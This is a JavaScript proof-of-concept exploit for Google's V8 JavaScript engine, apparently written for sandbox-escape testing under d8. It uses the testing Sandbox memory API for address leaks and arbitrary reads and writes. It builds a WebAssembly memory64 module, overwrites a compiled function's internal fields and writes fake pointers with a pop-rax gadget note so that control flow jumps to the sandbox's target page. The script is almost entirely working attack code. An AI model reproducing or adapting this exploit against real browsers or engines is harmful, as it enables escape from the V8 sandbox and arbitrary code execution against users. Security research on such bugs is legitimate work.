// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ppp.js

d8.file.execute('/src/v8/test/mjsunit/wasm/wasm-module-builder.js');
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }

  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }

  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }

console.log("[*] Leak sandbox base address");
// ================= reading heap_base =============================
let heap_addr = BigInt(Sandbox.base);
console.log("heap_addr: 0x" + heap_addr.toString(16));
let target_page = BigInt(Sandbox.targetPage);
console.log("target_page: 0x" + target_page.toString(16));
// ================================================================

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
const GB = 1024 * 1024 * 1024;
let $mem0 = builder.addMemory64(1 * GB / kPageSize);

let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);

let $sig_i_l = builder.addType(kSig_i_l);

builder.addFunction("func0", kSig_v_l).exportFunc().addBody([
  kExprLocalGet, 0,
  ...wasmI32Const(0),
  kExprI32StoreMem, 0, 0, // i32.store offset = -1
]);
builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
  kExprLocalGet, 0,
  kExprI64Const, 0 ,
  kExprI64Mul,
]);


let instance = builder.instantiate();


instance.exports.func1(0n);

// ===============================

v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x13n + 0xcn);
console.log((heap_addr + 0x200000n).toString(16));
let dummy = 1n;

let offset_base = 0x200171n; // magic number...

console.log("offset_base: 0x" + offset_base.toString(16));

v8_write64(0x200000n + 0x20n, heap_addr + 0x250000n);
v8_write64(0x250000n + 0xec48n, target_page); // pop rax -> jump rax

v8_write64(offset_base - 0x28n, target_page);
v8_write64(0x200000n + 0x58n, target_page);
v8_write64(0x200400n + 0x10n, 0x4242424242n);

v8_write64(offset_base, heap_addr + 0x200000n); // 0000555555D9F2F8                 test    rax, rax // in AddSample
v8_write64(offset_base - 0x20n, heap_addr + 0x200200n); // 000555555A65589                 test    rax, rax // outside AddSample, before StopInternal


// trigger
instance.exports.func1(0x4141n);
